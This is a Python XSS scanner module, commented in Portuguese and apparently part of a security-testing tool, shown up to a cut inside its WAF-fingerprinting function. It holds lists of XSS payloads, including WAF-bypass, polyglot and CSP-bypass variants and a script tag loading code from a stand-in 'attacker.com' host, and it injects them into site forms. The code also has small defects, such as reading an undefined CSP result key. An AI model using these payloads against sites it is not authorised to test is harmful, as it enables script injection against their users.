# -*- coding: utf-8 -*-
"""
XSS Scanner Module
Módulo para detecção de vulnerabilidades de Cross-Site Scripting (XSS).
"""

import requests
import re
import time
import json
import base64
import urllib.parse
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
from bs4 import BeautifulSoup
from rich.table import Table
import threading
import queue

# Import opcional do Selenium
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

from ..core import console, print_info, print_success, print_error, print_warning
from ..core.console import create_progress
from ..core.logger import get_logger
from ..utils.network import create_session


class XSSScanner:
    """Scanner avançado para detecção de vulnerabilidades XSS."""

    def __init__(self, base_url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False):
        self.base_url = base_url
        self.session = create_session()
        self.vulnerable_points = []
        self.payloads = self._load_payloads(custom_payloads_file)
        self.scan_stored = scan_stored
        self.fuzz_dom = fuzz_dom
        
        # Configurações avançadas inspiradas no DALFOX
        self.enable_bypasses = True
        self.context_analysis = True
        self.validate_execution = True
        self.analyze_csp = True
        self.verbose = False
        self.dom_verification = True
        self.parameter_mining = True
        self.bav_testing = True  # Blind Advanced Verification
        self.rate_limit_detection = True
        self.waf_fingerprint = True
        self.encoding_variations = True
        self.show_immediate_findings = False  # Controla se mostra achados durante o progresso
        
        # Estatísticas de scan
        self.stats = {
            'total_requests': 0,
            'reflected_params': 0,
            'dom_sinks': 0,
            'stored_vulns': 0,
            'bypasses_found': 0,
            'waf_detected': False,
            'scan_start_time': time.time(),
            'vulnerabilities_found': 0,  # Contador de vulnerabilidades para exibição limpa
            'last_vuln_count': 0  # Para detectar mudanças
        }
        
        # Driver Selenium (será inicializado quando necessário)
        self.driver = None
        self.headless_mode = True
        
        self.logger = get_logger(__name__)

    def _load_payloads(self, custom_payloads_file):
        """Carrega payloads de um ficheiro ou usa payloads padrão."""
        default_payloads = self._get_default_payloads()
        
        if custom_payloads_file:
            try:
                with open(custom_payloads_file, 'r', errors='ignore') as f:
                    custom_list = [line.strip() for line in f if line.strip()]
                    if not custom_list:
                        print_warning(f"O ficheiro de payloads '{custom_payloads_file}' está vazio. Usando payloads padrão.")
                        return default_payloads
                    print_info(f"Carregados [bold cyan]{len(custom_list)}[/bold cyan] payloads customizados de '{custom_payloads_file}'.")
                    
                    # Adiciona payloads customizados à categoria 'custom'
                    default_payloads['custom'] = custom_list
                    return default_payloads
            except FileNotFoundError:
                print_error(f"O ficheiro de payloads '{custom_payloads_file}' não foi encontrado. Usando payloads padrão.")
                return default_payloads
        
        # Converte dict para lista plana para compatibilidade com código existente
        all_payloads = []
        for category, payloads in default_payloads.items():
            all_payloads.extend(payloads)
        
        return all_payloads
    
    def _get_default_payloads(self):
        """Retorna payloads de XSS avançados inspirados no DALFOX."""
        return {
            # Payloads básicos para detecção rápida
            'basic': [
                "<script>alert('xss-test-spectra')</script>",
                "<img src=x onerror=alert('xss-test-spectra')>",
                "<svg onload=alert('xss-test-spectra')>",
                "<iframe src=javascript:alert('xss-test-spectra')>",
                "<body onload=alert('xss-test-spectra')>",
            ],
            
            # Payloads para DOM XSS
            'dom': [
                "'-alert('dom-xss-spectra')-'",
                "\"-alert('dom-xss-spectra')-\"",
                "javascript:alert('dom-xss-spectra')",
                "';alert('dom-xss-spectra');//",
                "\";alert('dom-xss-spectra');//",
                "</script><script>alert('dom-xss-spectra')</script>",
                "/**/alert('dom-xss-spectra')/**/",
                "eval(alert('dom-xss-spectra'))",
                "setTimeout(alert('dom-xss-spectra'),1)",
                "document.write('<script>alert(\"dom-xss-spectra\")</script>')"
            ],
            
            # Payloads para bypass de WAF
            'waf_bypass': [
                "<ScRiPt>alert('bypass-spectra')</ScRiPt>",
                "<SCRIPT>alert('bypass-spectra')</SCRIPT>",
                "<script\x0aalert('bypass-spectra')</script>",
                "<script\x0dalert('bypass-spectra')</script>",
                "<script\x09alert('bypass-spectra')</script>",
                "<script\x0calert('bypass-spectra')</script>",
                "<svg/onload=alert('bypass-spectra')>",
                "<img/src=x/onerror=alert('bypass-spectra')>",
                "<iframe//src=javascript:alert('bypass-spectra')>",
                "<<SCRIPT>alert('bypass-spectra')//<</SCRIPT>",
            ],
            
            # Payloads para contextos específicos
            'attribute': [
                "' onmouseover=alert('attr-spectra') '",
                "\" onmouseover=alert('attr-spectra') \"",
                "' onfocus=alert('attr-spectra') autofocus '",
                "\" onfocus=alert('attr-spectra') autofocus \"",
                "' onclick=alert('attr-spectra') '",
                "\" onclick=alert('attr-spectra') \"",
                "' onload=alert('attr-spectra') '",
                "\" onload=alert('attr-spectra') \"",
            ],
            
            # Payloads com encoding
            'encoded': [
                "%3Cscript%3Ealert('encoded-spectra')%3C/script%3E",
                "&#60;script&#62;alert('encoded-spectra')&#60;/script&#62;",
                "&lt;script&gt;alert('encoded-spectra')&lt;/script&gt;",
                "%253Cscript%253Ealert('double-encoded-spectra')%253C%252Fscript%253E",
                "\\u003cscript\\u003ealert('unicode-spectra')\\u003c/script\\u003e",
                "\\x3cscript\\x3ealert('hex-spectra')\\x3c/script\\x3e",
            ],
            
            # Polyglot payloads avançados
            'polyglot': [
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('polyglot-spectra')//'>",
                "\"'><img src=x onerror=alert('polyglot-spectra')>",
                "';alert('polyglot-spectra');//'><script>alert('polyglot-spectra')</script>",
                "\"><svg/onload=alert('polyglot-spectra')>",
                "*/alert('polyglot-spectra')/*",
                "'-alert('polyglot-spectra')-'",
                "\"-alert('polyglot-spectra')-\"",
            ],
            
            # Payloads para CSP bypass
            'csp_bypass': [
                "<script nonce>alert('csp-bypass-spectra')</script>",
                "<script src=data:,alert('csp-bypass-spectra')>",
                "<script src=//attacker.com/xss.js></script>",
                "<link rel=stylesheet href=data:,*{xss:expression(alert('csp-bypass-spectra'))}>",
                "<script>eval(location.hash.slice(1))</script>#alert('csp-bypass-spectra')",
                "<iframe src=javascript:parent.alert('csp-bypass-spectra')>",
            ]
        }

    def _detect_context(self, response_text, payload):
        """Detecta o contexto onde o payload foi refletido com análise avançada."""
        contexts = []
        escaped_payload = re.escape(payload)
        
        # Verifica se está em um script tag
        script_patterns = [
            rf'<script[^>]*>.*?{escaped_payload}.*?</script>',
            rf'<script[^>]*{escaped_payload}[^>]*>',
        ]
        for pattern in script_patterns:
            if re.search(pattern, response_text, re.DOTALL | re.IGNORECASE):
                contexts.append('script')
                break
        
        # Verifica se está em um atributo HTML
        attr_patterns = [
            rf'[a-zA-Z-]+\s*=\s*[\'"][^\'\"]*{escaped_payload}[^\'\"]*[\'"]',
            rf'[a-zA-Z-]+\s*=\s*{escaped_payload}(?:\s|>)',
        ]
        for pattern in attr_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                contexts.append('attribute')
                break
        
        # Verifica se está em um event handler
        event_handlers = [
            'onclick', 'onload', 'onmouseover', 'onfocus', 'onblur', 'onchange',
            'onsubmit', 'onkeydown', 'onkeyup', 'onkeypress', 'onerror'
        ]
        for handler in event_handlers:
            pattern = rf'{handler}\s*=\s*[\'"][^\'\"]*{escaped_payload}[^\'\"]*[\'"]'
            if re.search(pattern, response_text, re.IGNORECASE):
                contexts.append('event_handler')
                break
        
        # Verifica se está em CSS
        css_patterns = [
            rf'<style[^>]*>.*?{escaped_payload}.*?</style>',
            rf'style\s*=\s*[\'"][^\'\"]*{escaped_payload}[^\'\"]*[\'"]',
        ]
        for pattern in css_patterns:
            if re.search(pattern, response_text, re.DOTALL | re.IGNORECASE):
                contexts.append('css')
                break
        
        # Verifica se está em URL (href, src, etc.)
        url_attrs = ['href', 'src', 'action', 'formaction', 'data', 'poster']
        for attr in url_attrs:
            pattern = rf'{attr}\s*=\s*[\'"][^\'\"]*{escaped_payload}[^\'\"]*[\'"]'
            if re.search(pattern, response_text, re.IGNORECASE):
                contexts.append('url')
                break
        
        # Verifica se está em comentário HTML
        comment_pattern = rf'<!--.*?{escaped_payload}.*?-->'
        if re.search(comment_pattern, response_text, re.DOTALL | re.IGNORECASE):
            contexts.append('html_comment')
        
        # Verifica se está em JSON
        json_pattern = rf'[\'\"]{escaped_payload}[\'\"]\s*:\s*|:\s*[\'\"]{escaped_payload}[\'"]'
        if re.search(json_pattern, response_text, re.IGNORECASE):
            contexts.append('json')
        
        # Verifica se está em texto HTML normal
        if payload in response_text and not contexts:
            contexts.append('html_text')
        
        return contexts

    def _analyze_csp(self, response):
        """Analisa Content Security Policy com detalhes avançados."""
        csp_header = response.headers.get('Content-Security-Policy', '')
        csp_report_only = response.headers.get('Content-Security-Policy-Report-Only', '')
        
        if not csp_header and not csp_report_only:
            return {'present': False}
        
        # Usa CSP principal ou report-only
        active_csp = csp_header if csp_header else csp_report_only
        is_report_only = bool(csp_report_only and not csp_header)
        
        # Analisa diretivas específicas
        csp_analysis = {
            'present': True,
            'header': active_csp,
            'report_only': is_report_only,
            'directives': {},
            'bypasses': [],
            'risk_level': 'Low'
        }
        
        # Extrai diretivas
        directives = {}
        for directive in active_csp.split(';'):
            if ':' in directive:
                key, value = directive.strip().split(':', 1)
                directives[key.strip()] = value.strip()
        
        csp_analysis['directives'] = directives
        
        # Analisa script-src
        script_src = directives.get('script-src', directives.get('default-src', ''))
        if script_src:
            if "'unsafe-inline'" in script_src:
                csp_analysis['bypasses'].append("'unsafe-inline' permite scripts inline")
                csp_analysis['risk_level'] = 'High'
            if "'unsafe-eval'" in script_src:
                csp_analysis['bypasses'].append("'unsafe-eval' permite eval()")
                csp_analysis['risk_level'] = 'High'
            if 'data:' in script_src:
                csp_analysis['bypasses'].append("data: URIs permitidos")
                csp_analysis['risk_level'] = 'Medium'
            if '*' in script_src:
                csp_analysis['bypasses'].append("Wildcard (*) permite qualquer origem")
                csp_analysis['risk_level'] = 'High'
            if 'http:' in script_src:
                csp_analysis['bypasses'].append("HTTP permitido (inseguro)")
                csp_analysis['risk_level'] = 'Medium'
        else:
            csp_analysis['bypasses'].append("Nenhuma restrição script-src")
            csp_analysis['risk_level'] = 'High'
        
        # Verifica object-src
        object_src = directives.get('object-src', '')
        if object_src != "'none'":
            csp_analysis['bypasses'].append("object-src não restrito adequadamente")
            if csp_analysis['risk_level'] == 'Low':
                csp_analysis['risk_level'] = 'Medium'
        
        # Verifica base-uri
        base_uri = directives.get('base-uri', '')
        if not base_uri or base_uri != "'self'":
            csp_analysis['bypasses'].append("base-uri não restrito")
            if csp_analysis['risk_level'] == 'Low':
                csp_analysis['risk_level'] = 'Medium'
        
        return csp_analysis

    def _add_finding(self, risk, v_type, detail, recommendation):
        """Adiciona ou atualiza uma descoberta, priorizando XSS Armazenado. Suporte a modo verbose."""
        is_new_finding = True
        
        # Verifica se uma descoberta para este 'detalhe' já existe
        for i, finding in enumerate(self.vulnerable_points):
            if finding["Detalhe"] == detail:
                is_new_finding = False
                # Se a nova descoberta for "Armazenado" e a existente não for, atualiza-a.
                if v_type == "XSS Armazenado" and finding["Tipo"] != "XSS Armazenado":
                    self.vulnerable_points[i].update({
                        "Risco": "Alto",
                        "Tipo": "XSS Armazenado",
                        "Recomendação": recommendation
                    })
                    # Notificação verbose para upgrade de vulnerabilidade
                    if self.verbose:
                        print_warning(f"Vulnerabilidade atualizada para [bold red]XSS Armazenado[/bold red]: [cyan]{detail.split(' em ')[0] if ' em ' in detail else detail[:50]}[/cyan]")
                return  # Evita adicionar uma duplicada

        # Se não houver correspondência, adiciona a nova descoberta
        if is_new_finding:
            self.vulnerable_points.append({"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation})
            self.stats['vulnerabilities_found'] = len(self.vulnerable_points)
            
            # Notificação verbose para nova vulnerabilidade
            if self.verbose:
                param_name = detail.split("'")[1] if "'" in detail else detail.split(' em ')[0] if ' em ' in detail else detail[:50]
                risk_color = 'red' if risk == 'Alto' else 'yellow' if risk == 'Médio' else 'cyan'
                type_color = 'red' if 'Armazenado' in v_type else 'yellow' if 'DOM' in v_type else 'green'
                print_success(f"[{risk_color}]{risk}[/{risk_color}] - [{type_color}]{v_type}[/{type_color}] em [cyan]{param_name}[/cyan]")
    
    def _update_progress_with_vulns(self, progress, task_id, param_name):
        """Atualiza a descrição da barra de progresso com o número de vulnerabilidades encontradas de forma discreta."""
        vuln_count = len(self.vulnerable_points)
        if vuln_count > 0:
            vuln_text = f"[green]Testando [cyan]{param_name}[/cyan] | [red]{vuln_count} vuln(s)[/red]"
        else:
            vuln_text = f"[green]Testando [cyan]{param_name}[/cyan]"
        
        progress.update(task_id, description=vuln_text)

    def _scan_reflected(self, tasks, progress):
        """Executa o scan para XSS Refletido."""
        task_id = progress.add_task("[green]Testando XSS Refletido...", total=len(tasks))
        for method, url, param, form_data in tasks:
            progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan] (Refletido)...")
            
            # Primeiro, testa com um payload simples para detectar contexto
            test_payload = "xss-context-test-12345"
            test_data = {param: test_payload}
            context_detected = False
            
            try:
                if method.lower() == 'get':
                    response = self.session.get(url, params=test_data, timeout=7, verify=False)
                else: # POST
                    post_payload = (form_data or {}).copy()
                    post_payload[param] = test_payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)

                # Analisa CSP
                csp_info = self._analyze_csp(response)
                
                if test_payload in response.text:
                    # Detecta contexto onde o payload foi refletido
                    contexts = self._detect_context(response.text, test_payload)
                    
                    if contexts:
                        context_detected = True
                        # Testa payloads específicos para o contexto detectado
                        for payload in self.payloads[:10]:  # Usa os primeiros 10 payloads
                            test_data_context = {param: payload}
                            try:
                                if method.lower() == 'get':
                                    context_response = self.session.get(url, params=test_data_context, timeout=7, verify=False)
                                else:
                                    post_payload_context = (form_data or {}).copy()
                                    post_payload_context[param] = payload
                                    context_response = self.session.post(url, data=post_payload_context, timeout=7, verify=False)
                                
                                if payload in context_response.text:
                                    detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                                    context_str = ', '.join(contexts)
                                    csp_warning = ""
                                    if csp_info['present']:
                                        if csp_info['report_only']:
                                            csp_warning = " (CSP em modo Report-Only)"
                                        elif csp_info['allows_inline_script']:
                                            csp_warning = " (CSP permite scripts inline)"
                                        else:
                                            csp_warning = " (CSP presente mas pode ter bypass)"
                                    
                                    rec = f"Payload '{payload}' foi refletido no contexto: {context_str}{csp_warning}. Validar execução manual."
                                    
                                    # Ajusta o risco baseado no contexto e CSP
                                    risk = "Alto" if any(ctx in ['script', 'event_handler', 'html_text'] for ctx in contexts) else "Médio"
                                    if csp_info['present'] and not csp_info['allows_inline_script'] and not csp_info['report_only']:
                                        risk = "Médio"  # Reduz o risco se CSP está ativo
                                    
                                    self._add_finding(risk, "XSS Refletido", detail, rec)
                                    break
                            except requests.RequestException:
                                continue
                        
                        if context_detected:
                            break  # Passou para o próximo parâmetro se encontrou um contexto
                
                # Se não detectou contexto específico, testa com payloads gerais
                if not context_detected:
                    for payload in self.payloads[:5]:  # Reduz para 5 payloads base
                        test_data = {param: payload}
                        try:
                            if method.lower() == 'get':
                                response = self.session.get(url, params=test_data, timeout=7, verify=False)
                            else:
                                post_payload = (form_data or {}).copy()
                                post_payload[param] = payload
                                response = self.session.post(url, data=post_payload, timeout=7, verify=False)

                            if payload in response.text:
                                detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                                rec = f"Payload '{payload}' foi refletido sem sanitização."
                                self._add_finding("Médio", "XSS Refletido", detail, rec)
                                break
                                
                        except requests.RequestException:
                            continue
                            
            except requests.RequestException:
                pass
        progress.remove_task(task_id)

    def _scan_reflected_advanced(self, tasks, progress, waf_info):
        """Executa o scan para XSS Refletido com técnicas avançadas."""
        task_id = progress.add_task("[green]Scan XSS Refletido Avançado...", total=len(tasks))
        
        for method, url, param, form_data in tasks:
            # Atualiza progresso de forma limpa
            self._update_progress_with_vulns(progress, task_id, param)
            progress.update(task_id, advance=1)
            
            # Primeiro, testa com payload de análise de contexto
            test_payload = "xss-context-test-spectra-12345"
            test_data = {param: test_payload}
            
            try:
                if method.lower() == 'get':
                    response = self.session.get(url, params=test_data, timeout=7, verify=False)
                else:
                    post_payload = (form_data or {}).copy()
                    post_payload[param] = test_payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)
                
                self.stats['total_requests'] += 1
                
                if test_payload in response.text:
                    self.stats['reflected_params'] += 1
                    
                    # Log verbose para parâmetro refletido
                    if self.verbose:
                        print_info(f"Parâmetro [cyan]{param}[/cyan] reflete entrada - analisando contexto...")
                    
                    # Análise de contexto
                    contexts = self._detect_context(response.text, test_payload)
                    
                    # Log verbose para contexto detectado
                    if self.verbose and contexts:
                        context_str = ', '.join(contexts)
                        print_info(f"Contexto detectado: [yellow]{context_str}[/yellow]")
                    
                    # Análise CSP
                    csp_info = self._analyze_csp(response)
                    
                    # Log verbose para CSP
                    if self.verbose and csp_info.get('present'):
                        if csp_info.get('report_only'):
                            print_warning("CSP detectado em modo [yellow]Report-Only[/yellow]")
                        elif csp_info.get('bypasses'):
                            print_warning(f"CSP vulnerável detectado: [red]{', '.join(csp_info['bypasses'][:2])}[/red]")
                        else:
                            print_info("CSP ativo detectado")
                    
                    # Log verbose para WAF bypass
                    if self.verbose and waf_info.get('detected'):
                        print_info(f"Testando payloads de bypass para WAF [cyan]{waf_info['name']}[/cyan]...")
                    
                    # Seleciona payloads baseados no contexto e WAF (versão simplificada)
                    all_payloads_dict = self._get_default_payloads()
                    selected_payloads = []
                    selected_payloads.extend(all_payloads_dict['basic'][:3])
                    if 'attribute' in contexts:
                        selected_payloads.extend(all_payloads_dict['attribute'][:2])
                    if waf_info.get('detected'):
                        selected_payloads.extend(all_payloads_dict['waf_bypass'][:3])
                    if self.encoding_variations:
                        selected_payloads.extend(all_payloads_dict['encoded'][:2])
                    selected_payloads.extend(all_payloads_dict['polyglot'][:2])
                    
                    # Testa payloads selecionados
                    for payload in selected_payloads[:15]:  # Limite inteligente
                        # Aplica variações de encoding se necessário
                        payload_variations = self._apply_encoding_variations(payload)
                        
                        for variant in payload_variations[:3]:  # Máximo 3 variações por payload
                            test_data_variant = {param: variant}
                            
                            try:
                                if method.lower() == 'get':
                                    variant_response = self.session.get(url, params=test_data_variant, timeout=7, verify=False)
                                else:
                                    post_payload_variant = (form_data or {}).copy()
                                    post_payload_variant[param] = variant
                                    variant_response = self.session.post(url, data=post_payload_variant, timeout=7, verify=False)
                                
                                self.stats['total_requests'] += 1
                                
                                if variant in variant_response.text:
                                    # Verifica se é um bypass de WAF
                                    is_waf_bypass = waf_info['detected'] and variant != payload
                                    if is_waf_bypass:
                                        self.stats['bypasses_found'] += 1
                                        # Log verbose para bypass de WAF
                                        if self.verbose:
                                            print_success(f"Bypass de WAF encontrado com payload: [green]{variant[:50]}[/green]")
                                    
                                    detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                                    context_str = ', '.join(contexts) if contexts else 'Desconhecido'
                                    
                                    # Monta recomendação baseada no contexto e CSP
                                    rec_parts = [f"Payload '{variant}' refletido no contexto: {context_str}"]
                                    
                                    if csp_info.get('present'):
                                        if csp_info.get('report_only'):
                                            rec_parts.append("CSP em modo Report-Only")
                                        elif csp_info.get('bypasses'):
                                            rec_parts.append(f"CSP vulnerável: {'; '.join(csp_info['bypasses'][:2])}")
                                        else:
                                            rec_parts.append("CSP presente")
                                    
                                    if waf_info['detected']:
                                        rec_parts.append(f"WAF detectado: {waf_info['name']}")
                                    
                                    rec = ". ".join(rec_parts) + ". Validar execução manual."
                                    
                                    # Calcula risco baseado em múltiplos fatores (versão simplificada)
                                    risk_score = 0
                                    if 'script' in contexts or 'event_handler' in contexts:
                                        risk_score += 3
                                    elif 'html_text' in contexts:
                                        risk_score += 2
                                    elif 'attribute' in contexts:
                                        risk_score += 1
                                    
                                    if not csp_info.get('present'):
                                        risk_score += 2
                                    elif csp_info.get('report_only'):
                                        risk_score += 1
                                    
                                    if variant != payload and waf_info.get('detected'):
                                        risk_score += 2
                                    
                                    if risk_score >= 5:
                                        risk = "Alto"
                                    elif risk_score >= 3:
                                        risk = "Médio"
                                    else:
                                        risk = "Baixo"
                                    
                                    self._add_finding(risk, "XSS Refletido", detail, rec)
                                    # Atualiza descrição do progresso com novo achado
                                    # Silenciosa - não atualiza progresso individual aqui
                                    break  # Para com o primeiro sucesso
                                    
                            except requests.RequestException:
                                continue
                        
                        # Rate limiting inteligente
                        if waf_info['detected']:
                            time.sleep(0.5)  # Mais lento se WAF detectado
                
            except requests.RequestException:
                continue
        
        progress.remove_task(task_id)

    def _scan_dom_xss(self, tasks, progress):
        """Executa scan específico para DOM XSS."""
        task_id = progress.add_task("[blue]Scan DOM XSS...", total=len(tasks))
        
        for method, url, param, form_data in tasks:
            if method.lower() != 'get':  # DOM XSS é principalmente GET
                progress.update(task_id, advance=1)
                continue
                
            # Atualiza progresso de forma limpa
            self._update_progress_with_vulns(progress, task_id, param)
            progress.update(task_id, advance=1)
            
            # Payloads específicos para DOM
            dom_payloads = self._get_default_payloads()['dom']
            
            for payload in dom_payloads[:10]:  # Limite para DOM
                if self._detect_dom_xss(url, param, payload, progress):
                    self.stats['dom_sinks'] += 1
                    
                    # Log verbose para DOM XSS detectado
                    if self.verbose:
                        print_success(f"DOM XSS confirmado via Selenium em [cyan]{param}[/cyan]")
                    
                    detail = f"DOM XSS no parâmetro '{param}' em {url}"
                    rec = f"Payload DOM '{payload}' executado com sucesso via Selenium. Vulnerabilidade confirmada."
                    
                    self._add_finding("Alto", "DOM XSS", detail, rec)
                    # Atualiza descrição do progresso com novo achado
                    # Silenciosa - não atualiza progresso individual aqui
                    break  # Para no primeiro sucesso
        
        progress.remove_task(task_id)

    def _inject_into_forms(self, forms, progress):
        """Submete payloads em todos os formulários encontrados."""
        total_fields = sum(len([i for i in form.find_all(['input', 'textarea']) if i.get('name')]) for form in forms)
        
        if total_fields == 0:
            return
            
        submission_task = progress.add_task("[green]Submetendo payloads (Stored XSS)...", total=total_fields * len(self.payloads[:5]))
        
        for form in forms:
            action = urljoin(self.base_url, form.get('action', '')) if form.get('action') else self.base_url
            method = form.get('method', 'post').lower()
            
            if method != 'post':
                progress.update(submission_task, advance=len(self.payloads[:5]) * len([i for i in form.find_all(['input', 'textarea']) if i.get('name')]))
                continue

            # Prepara dados base do formulário
            base_data = {}
            
            # Inclui campos hidden
            for hidden_field in form.find_all('input', {'type': 'hidden'}):
                if hidden_field.get('name'):
                    base_data[hidden_field['name']] = hidden_field.get('value', '')
            
            # Valores padrão para campos normais
            for field in form.find_all(['input', 'textarea']):
                field_name = field.get('name')
                field_type = field.get('type', 'text')
                
                if field_name and field_type not in ['hidden', 'submit', 'button']:
                    if field_type == 'email':
                        base_data[field_name] = 'test@example.com'
                    elif field_type == 'number':
                        base_data[field_name] = '123'
                    elif field_type == 'url':
                        base_data[field_name] = 'http://example.com'
                    else:
                        base_data[field_name] = 'test'
            
            # Testa cada campo com payloads
            for field in form.find_all(['input', 'textarea']):
                field_name = field.get('name')
                field_type = field.get('type', 'text')
                
                if not field_name or field_type in ['hidden', 'submit', 'button']:
                    continue
                
                for payload in self.payloads[:5]:  # Limita para performance
                    # Atualiza progresso de forma limpa
                    self._update_progress_with_vulns(progress, submission_task, field_name)
                    progress.update(submission_task, advance=1)
                    
                    # Cria dados de teste
                    test_data = base_data.copy()
                    test_data[field_name] = payload
                    
                    try:
                        self.session.post(action, data=test_data, timeout=7, verify=False)
                    except requests.RequestException:
                        continue
        
        progress.remove_task(submission_task)

    def _verify_storage(self, progress):
        """Rasteia o site para verificar a persistência dos payloads."""
        crawl_task = progress.add_task("[green]Verificando páginas para Stored XSS...", total=None)
        
        to_visit = [self.base_url]
        visited = set()
        
        while to_visit and len(visited) < 10:  # Limita a 10 páginas para performance
            current_url = to_visit.pop(0)
            if current_url in visited:
                continue
            visited.add(current_url)
            progress.update(crawl_task, advance=1, description=f"Verificando {current_url[:60]}...")

            try:
                response = self.session.get(current_url, timeout=7, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser', from_encoding=response.encoding)
                page_text = soup.get_text()

                for payload in self.payloads[:5]:  # Verifica apenas os primeiros 5 payloads
                    if payload in response.text or payload in page_text:
                        # Log verbose para payload persistido encontrado
                        if self.verbose:
                            print_warning(f"Payload persistido encontrado em [cyan]{current_url}[/cyan]: [yellow]{payload[:30]}[/yellow]")
                        
                        # Se o payload for encontrado, atualiza findings existentes ou cria novos
                        found_and_upgraded = False
                        for finding in self.vulnerable_points:
                            if payload in finding["Recomendação"]:
                                self._add_finding("Alto", "XSS Armazenado", finding["Detalhe"], f"Payload '{payload}' foi submetido e persistiu na aplicação.")
                                found_and_upgraded = True
                        
                        if not found_and_upgraded:
                            detail = f"Payload persistiu e foi encontrado em {current_url}"
                            self._add_finding("Alto", "XSS Armazenado", detail, f"Payload '{payload}' foi submetido e persistiu na aplicação.")

                # Coleta links para continuar a verificação
                base_netloc = urlparse(self.base_url).netloc
                for link_tag in soup.find_all('a', href=True):
                    link = urljoin(self.base_url, link_tag['href'])
                    if urlparse(link).netloc == base_netloc and link not in visited and len(to_visit) < 5:
                        to_visit.append(link)
            except (requests.RequestException, UnicodeDecodeError):
                continue
        progress.remove_task(crawl_task)

    def _init_selenium_driver(self):
        """Inicializa o driver Selenium para verificação DOM."""
        if not SELENIUM_AVAILABLE:
            print_warning("Selenium não instalado. DOM XSS verification desabilitado.")
            self.dom_verification = False
            return False
            
        if self.driver:
            return True
            
        try:
            chrome_options = Options()
            if self.headless_mode:
                chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-images')
            chrome_options.add_argument('--disable-javascript-harmony-shipping')
            chrome_options.add_argument('--disable-background-timer-throttling')
            chrome_options.add_argument('--disable-renderer-backgrounding')
            chrome_options.add_argument('--disable-backgrounding-occluded-windows')
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(10)
            self.driver.implicitly_wait(3)
            return True
        except Exception as e:
            self.logger.warning(f"Não foi possível inicializar Selenium: {e}")
            print_warning("Chrome/ChromeDriver não encontrado. DOM XSS verification desabilitado.")
            self.dom_verification = False
            return False

    def _cleanup_selenium(self):
        """Limpa recursos do Selenium."""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None

    def _detect_dom_xss(self, url, param, payload, progress=None):
        """Detecta DOM XSS usando Selenium."""
        if not self.dom_verification or not self._init_selenium_driver():
            return False

        try:
            # Constrói URL com payload
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = urlunparse(parsed_url._replace(query=new_query))
            
            if progress:
                progress.update(description=f"[blue]Verificando DOM XSS em [cyan]{param}[/cyan]...")
            
            # Carrega a página
            self.driver.get(test_url)
            
            # Aguarda execução do JavaScript
            time.sleep(2)
            
            # Verifica se houve execução de alert
            try:
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.dismiss()
                
                if 'dom-xss-spectra' in alert_text or 'xss-test-spectra' in alert_text:
                    return True
            except:
                pass
            
            # Verifica modificações no DOM
            dom_changes = self.driver.execute_script("""
                return {
                    modified: document.documentElement.innerHTML.includes('xss-test-spectra') || 
                             document.documentElement.innerHTML.includes('dom-xss-spectra'),
                    newElements: document.querySelectorAll('script[src*="xss"], iframe[src*="javascript:"], img[onerror]').length > 0,
                    jsErrors: window.performance && window.performance.getEntriesByType('navigation')[0].loadEventEnd > 0
                };
            """)
            
            if dom_changes.get('modified') or dom_changes.get('newElements'):
                return True
                
        except Exception as e:
            self.logger.debug(f"Erro na verificação DOM: {e}")
            
        return False

    def _mine_parameters(self, response_text, base_url):
        """Extrai parâmetros potenciais do JavaScript e HTML."""
        if not self.parameter_mining:
            return []
            
        parameters = set()
        
        # Extrai parâmetros de JavaScript
        js_patterns = [
            r'[\'"]([\w\-]+)[\'"]:\s*[\'"]?[\w\-\.]+[\'"]?',  # objeto JS
            r'\.get\([\'"](\w+)[\'"]',  # .get('param')
            r'\.(\w+)\s*=',  # .param = 
            r'data-(\w+)',  # data-attributes
            r'name=[\'"](\w+)[\'"]',  # name attributes
            r'id=[\'"](\w+)[\'"]',  # id attributes
        ]
        
        for pattern in js_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            parameters.update(matches)
        
        # Extrai parâmetros de formulários ocultos
        soup = BeautifulSoup(response_text, 'html.parser')
        for input_elem in soup.find_all('input', {'type': 'hidden'}):
            if input_elem.get('name'):
                parameters.add(input_elem['name'])
        
        # Parâmetros comuns para teste
        common_params = [
            'q', 'search', 'query', 'keyword', 'term', 'find', 's',
            'page', 'id', 'user', 'username', 'name', 'email',
            'callback', 'redirect', 'url', 'link', 'src', 'file',
            'input', 'data', 'value', 'content', 'text', 'msg'
        ]
        
        parameters.update(common_params)
        return list(parameters)

    def _waf_fingerprint(self, response):
        """Detecta presença de WAF específico."""
        if not self.waf_fingerprint:
            return {'detected': False}
            
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
